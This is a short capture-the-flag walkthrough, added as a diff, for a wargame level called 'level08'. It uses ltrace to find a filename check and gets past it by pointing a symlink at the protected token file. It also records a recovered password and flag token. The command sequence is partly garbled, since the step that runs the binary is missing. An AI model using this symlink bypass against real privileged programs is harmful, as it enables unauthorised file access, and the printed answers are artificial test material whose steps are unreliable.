@@ -1,0 +1,17 @@
+# We can see we have a binary file and a file named token
+# Let's ltrace it
+	ltrace ./level08 token
+# We see we can access the token file -> strstr("token", "token")                                                              = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+# a strstr check is done so it does not allow us to read the token file
+# Let's try a symbolic link on somewhere we can have correct rights access on the file
+	cd /tmp
+	mkdir ret
+	chmod 777 ret
+	cd ret
+	ln -s ~/token exploit
+# Let's then run the binary file that file as arg
+	su flag08
+# Password  is : quif5eloekouj29ke0vouxean
+	getflag
+# Token is : 25749xKZ8L7DkSCwJkT9dyv6f
